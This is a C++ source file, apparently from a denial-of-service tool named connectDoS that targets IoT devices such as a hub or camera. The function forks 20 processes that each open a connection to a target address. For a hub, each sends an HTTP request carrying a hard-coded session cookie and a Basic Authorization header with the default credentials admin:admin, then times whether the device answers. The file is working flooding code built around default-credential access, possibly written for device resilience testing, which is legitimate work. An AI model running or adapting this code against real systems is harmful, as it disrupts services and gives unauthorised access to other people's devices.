#include "connectDoS.h"

using namespace std::chrono;

void connectDoS::openCon(arg arg){
  struct sockaddr_in addr;
  string message;
  char answer[1024];
  string correct, ending;
  struct hostent *hent;
  int sock, num, reciv, numof;
  struct timeval tv;
  pid_t pid;
  bool counter = false, htmlend = false;

  tv.tv_sec = arg.timeout;
  tv.tv_usec = 0;

  for (int i = 0; i < 20; i++) {
    pid = fork();
    if(pid == 0){
      numof=i;
      break;
    }
    sleep(arg.pause);
  }

  if(pid != 0){
    wait(NULL);
    exit(0);
  }

  bzero(&addr, sizeof(addr));
  if((hent = gethostbyname(arg.ip_address.c_str()))==NULL){std::cout << "neexistuje host" << '\n';}
  bcopy(hent->h_addr,&addr.sin_addr.s_addr,hent->h_length);
  addr.sin_family = AF_INET;
  addr.sin_port = htons(arg.port);

  if ((sock = socket(AF_INET,SOCK_STREAM,0))<0) {
    close(sock);
    cout<<"socket bad"<<endl;
  }

  if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {std::cout << "Nepodarilo sa nastaviť timeout na socket" << '\n';}
  auto start = high_resolution_clock::now();

  if (connect(sock,(sockaddr*)&addr,sizeof(addr)) < 0) {
    counter=true;
    strerror(errno);
  }
  else{
      switch (arg.device) {
        case HUB:
        message = "GET /cgi-bin/index.php HTTP/1.1\r\nHost: "+ arg.ip_address +"\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nCookie: PHPSESSID=a16562c36763020614e6f4f7da1136da\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n\r\n";
        break;
        case CAMERA:
        break;
        case GATEWAY:
        err(UNKNOWN, -1);
        break;
        default:
        err(UNKNOWN, -1);
        break;
      }

      if (sendto(sock, message.c_str(), strlen(message.c_str()), MSG_NOSIGNAL/*|MSG_DONTWAIT*/, NULL, 0)<0){
        counter=true;
      }
      else{
        counter=true;
        while((reciv = recv(sock,answer,1024,0)) > 0){
          num = 0;
          while(num < reciv){
            correct+=answer[num];
            num++;
          }
          ending = correct.substr(correct.size()-4,4);
          if(strcmp(ending.c_str(), "\r\n\r\n") == 0 ){
            if(htmlend == true){
              counter=false;
              break;
            }
            htmlend=true;
          }
        }
      }
  }
  close(sock);
  auto stop = high_resolution_clock::now();
  auto duration = duration_cast<microseconds>(stop - start);
  std::time_t start_time = std::chrono::system_clock::to_time_t(start);
  std::time_t end_time = std::chrono::system_clock::to_time_t(stop);
  std::cout << numof << ". " << "\tStart: " << std::ctime(&start_time) << "\tEnded: " << std::ctime(&end_time) << "\tDuration: " << duration.count() << " microseconds\t" << (counter != true ? "Finished" : "Timedout") << '\n';

}
